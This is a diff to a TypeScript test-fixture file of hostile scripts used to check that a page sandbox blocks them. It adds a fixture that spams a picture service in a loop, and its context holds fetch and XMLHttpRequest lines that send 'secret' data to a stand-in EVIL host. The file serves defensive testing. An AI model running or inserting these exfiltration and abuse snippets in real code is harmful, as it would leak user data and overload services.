@@ -17,6 +17,8 @@ export interface HostileFixture {
   /** the document: markup with an inline script, as the brain would write it */
   readonly source: string;
   readonly must: {
+    /** at most this many picture asks may reach the host (the page's picture service); the rest are refused or never sent */
+    readonly pictures?: number;
     readonly silent: boolean;
     /** the program is refused: its result begins `blocked:`; false where the attempt gives no result (a navigation) */
     readonly denied?: boolean;
@@ -38,6 +40,8 @@ function attempt(code: string): string {
 const net = (name: string, threat: string, code: string, policyOnly = false): HostileFixture => ({ name, threat, source: attempt(code), must: { silent: true, denied: true }, policyOnly });
 
 export const HOSTILE: readonly HostileFixture[] = [
+  // spams the picture call: the bridge and the host cap what reaches the picture service
+  { name: 'picture-spam', threat: 'conduit.picture called in a loop, with huge or odd arguments', source: attempt(`var n=0;for(var i=0;i<200;i++){conduit.picture('coffee '+i,{w:1e9,h:-5}).then(function(p){if(p!==null)n++})}conduit.picture('x'.repeat(10000));return new Promise(function(res){setTimeout(function(){res('got '+n)},900)})`), must: { silent: true, pictures: 4 } },
   // sends data out
   net('fetch', 'fetch() an address with data in it', `return fetch('${EVIL}/fetch?d=secret').then(function(r){return r.status})`, true),
   net('xhr', 'XMLHttpRequest, synchronous', `var x=new XMLHttpRequest();x.open('GET','${EVIL}/xhr?d=secret',false);x.send();return x.status`, true),
